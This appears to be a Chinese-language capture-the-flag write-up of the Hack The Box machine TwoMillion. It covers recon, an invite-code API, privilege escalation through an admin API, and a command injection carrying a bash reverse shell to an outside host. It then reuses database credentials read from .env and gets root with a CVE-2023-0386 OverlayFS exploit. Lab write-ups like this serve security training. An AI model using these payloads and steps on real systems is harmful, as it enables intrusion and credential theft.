# 信息搜集

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap --min-rate 10000 -p- 10.129.38.11    
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-10 01:29 EDT
Nmap scan report for 10.129.38.11
Host is up (7.9s latency).
Not shown: 64798 filtered tcp ports (no-response), 735 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 24.84 seconds
```

# 漏洞利用

看一下80端口有什么

```
┌──(kali㉿kali)-[~]
└─$ curl http://10.129.38.11
<html>
<head><title>301 Moved Permanently</title></head>
<body>
<center><h1>301 Moved Permanently</h1></center>
<hr><center>nginx</center>
</body>
</html>
┌──(kali㉿kali)-[~]
└─$ curl -i http://10.129.38.11
HTTP/1.1 301 Moved Permanently
Server: nginx
Date: Sun, 10 May 2026 05:33:27 GMT
Content-Type: text/html
Content-Length: 162
Connection: keep-alive
Location: http://2million.htb/

<html>
<head><title>301 Moved Permanently</title></head>
<body>
<center><h1>301 Moved Permanently</h1></center>
<hr><center>nginx</center>
</body>
</html>
```

添加一下hosts

```
┌──(kali㉿kali)-[~]
└─$ sudo sed -i '/10.129.38.11/d' /etc/hosts && echo "10.129.38.11 2million.htb" | sudo tee -a /etc/hosts
[sudo] password for kali: 
10.129.38.11 2million.htb
```

看一下2million.htb

<img width="1920" height="815" alt="图片" src="https://github.com/user-attachments/assets/3af3d405-161f-4825-8992-14ad803c5db5" />

目录枚举

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -x html,php,txt -u http://2million.htb --exclude-length 162
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://2million.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] Exclude Length:          162
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/404                  (Status: 200) [Size: 1674]
/api                  (Status: 401) [Size: 0]
/home                 (Status: 302) [Size: 0] [--> /]
/invite               (Status: 200) [Size: 3859]
/login                (Status: 200) [Size: 3704]
/logout               (Status: 302) [Size: 0] [--> /]
/register             (Status: 200) [Size: 4527]
===============================================================
Finished
===============================================================
```

注册需要邀请码，看一下如何拿到这个邀请码，查看原码能发现文件inviteapi.min.js

```
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
```

存在混淆

```
function verifyInviteCode(code){
    var formData = {"code": code};

    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/verify',
        data: formData,
        success: function(response){
            console.log(response);
        },
        error: function(response){
            console.log(response);
        }
    });
}
```

存在隐藏api：/api/v1/invite/how/to/generate

```
┌──(kali㉿kali)-[~]
└─$ curl -X POST http://2million.htb/api/v1/invite/generate
{"0":200,"success":1,"data":{"code":"R1VRSzgtNUYyVFItVTFLTjgtQUNYMEc=","format":"encoded"}}
```

解码后得到：GUQK8-5F2TR-U1KN8-ACX0G，现在创建一个账号进行登录

<img width="1920" height="752" alt="图片" src="https://github.com/user-attachments/assets/26cd8147-6063-49fd-9b97-a6fbde2cb4b0" />

点击连接，进行抓包

```
GET /api/v1/user/vpn/generate HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://2million.htb/home/access
Cookie: PHPSESSID=rb5k0qe4hgqcqu7hhsef0q7ucm
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
Priority: u=0, i
```

访问/api/v1，返回了很多接口

<img width="1265" height="645" alt="图片" src="https://github.com/user-attachments/assets/a60bf3b6-665f-4aab-9c3f-bcceea352d02" />

访问一下/api/v1/admin/auth，没有权限

<img width="1257" height="650" alt="图片" src="https://github.com/user-attachments/assets/a0aa1f0c-34f4-44be-af29-8766e8adc0b8" />

访问一下/api/v1/admin/settings/update

<img width="1262" height="643" alt="图片" src="https://github.com/user-attachments/assets/16e1ddc1-00cc-49f5-acd8-41968a9d24ef" />

修改成put方式

<img width="1256" height="648" alt="图片" src="https://github.com/user-attachments/assets/a50f9540-f528-4298-a8bb-e9295e441c0d" />

添加一个Content-Type: application/json

<img width="1258" height="651" alt="图片" src="https://github.com/user-attachments/assets/06fc7e54-2ead-4f1b-ad98-03f7b894800d" />

添加一下email参数

<img width="1261" height="650" alt="图片" src="https://github.com/user-attachments/assets/5ce6d319-98a0-49ba-9b53-7245acbefb38" />

尝试赋权

<img width="1260" height="649" alt="图片" src="https://github.com/user-attachments/assets/7899887d-afc3-4295-974a-831d5020d2fc" />

重新访问一下/api/v1/admin/auth，现在返回是true，已经成功越权

<img width="1265" height="648" alt="图片" src="https://github.com/user-attachments/assets/2d17eb9d-5f51-4f4e-b78c-afc6d3fa9cb6" />

尝试访问/api/v1/admin/vpn/generate

<img width="1207" height="300" alt="图片" src="https://github.com/user-attachments/assets/c436eb6a-196b-4d15-b697-fd972afd490b" />

添加参数

<img width="1258" height="646" alt="图片" src="https://github.com/user-attachments/assets/ec5bd02e-8e74-4342-a800-a810bbadd83c" />

修改用户名，也能返回，尝试命令执行

<img width="1260" height="375" alt="图片" src="https://github.com/user-attachments/assets/38deb211-6f49-4897-835b-37ba2ab2794b" />

反弹一个shell回来:"username":"123;bash -c '/bin/bash -i >& /dev/tcp/10.10.16.109/1234 0>&1' #"

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1234                    
listening on [any] 1234 ...
connect to [10.10.16.109] from (UNKNOWN) [10.129.38.11] 54700
bash: cannot set terminal process group (1096): Inappropriate ioctl for device
bash: no job control in this shell
www-data@2million:~/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 权限提升

```
www-data@2million:~/html$ ls -la
ls -la
total 56
drwxr-xr-x 10 root root 4096 May 10 07:20 .
drwxr-xr-x  3 root root 4096 Jun  6  2023 ..
-rw-r--r--  1 root root   87 Jun  2  2023 .env
-rw-r--r--  1 root root 1237 Jun  2  2023 Database.php
-rw-r--r--  1 root root 2787 Jun  2  2023 Router.php
drwxr-xr-x  5 root root 4096 May 10 07:20 VPN
drwxr-xr-x  2 root root 4096 Jun  6  2023 assets
drwxr-xr-x  2 root root 4096 Jun  6  2023 controllers
drwxr-xr-x  5 root root 4096 Jun  6  2023 css
drwxr-xr-x  2 root root 4096 Jun  6  2023 fonts
drwxr-xr-x  2 root root 4096 Jun  6  2023 images
-rw-r--r--  1 root root 2692 Jun  2  2023 index.php
drwxr-xr-x  3 root root 4096 Jun  6  2023 js
drwxr-xr-x  2 root root 4096 Jun  6  2023 views
www-data@2million:~/html$ cat .env
cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
┌──(kali㉿kali)-[~]
└─$ ssh admin@10.129.38.11      
The authenticity of host '10.129.38.11 (10.129.38.11)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.38.11' (ED25519) to the list of known hosts.
admin@10.129.38.11's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.70-051570-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun May 10 07:31:50 AM UTC 2026

  System load:           0.0
  Usage of /:            75.2% of 4.82GB
  Memory usage:          9%
  Swap usage:            0%
  Processes:             219
  Users logged in:       0
  IPv4 address for eth0: 10.129.38.11
  IPv6 address for eth0: dead:beef::250:56ff:feb9:278b

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

You have mail.
Last login: Tue Jun  6 12:43:11 2023 from 10.10.14.6
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@2million:~$
//登陆提示有邮件
admin@2million:~$ find / -name "mail" 2>/dev/null
/snap/core20/1891/var/mail
/snap/core20/1891/var/spool/mail
/var/spool/mail
/var/mail
/usr/lib/python3/dist-packages/twisted/mail
/usr/lib/byobu/mail
admin@2million:~$ cd /var/mail
admin@2million:/var/mail$ ls
admin
admin@2million:/var/mail$ cat admin 
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
admin@2million:/tmp$ cd CVE-2023-0386-main/
admin@2million:/tmp/CVE-2023-0386-main$ ls-la
ls-la: command not found
admin@2million:/tmp/CVE-2023-0386-main$ ls -la
total 40
drwxrwxr-x  4 admin admin 4096 May  8  2023 .
drwxrwxrwt 19 root  root  4096 May 10 07:56 ..
-rw-rw-r--  1 admin admin 3093 May  8  2023 exp.c
-rw-rw-r--  1 admin admin 5616 May  8  2023 fuse.c
-rw-rw-r--  1 admin admin  549 May  8  2023 getshell.c
-rw-rw-r--  1 admin admin  150 May  8  2023 Makefile
drwxrwxr-x  2 admin admin 4096 May  8  2023 ovlcap
-rw-rw-r--  1 admin admin  222 May  8  2023 README.md
drwxrwxr-x  2 admin admin 4096 May  8  2023 test
//需要两个终端
admin@2million:/tmp/CVE-2023-0386-main$ ./fuse ./ovlcap/lower ./gc
[+] len of gc: 0x3ee0
[+] readdir
[+] getattr_callback
/file
[+] open_callback
/file
[+] read buf callback
offset 0
size 16384
path /file
[+] open_callback
/file
[+] open_callback
/file
[+] ioctl callback
path /file
cmd 0x80086601
//第二个终端
admin@2million:/tmp/CVE-2023-0386-main$ ./exp
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 May 10 07:58 .
drwxrwxr-x 6 root   root     4096 May 10 07:58 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@2million:/tmp/CVE-2023-0386-main# id
uid=0(root) gid=0(root) groups=0(root),1000(admin)
```
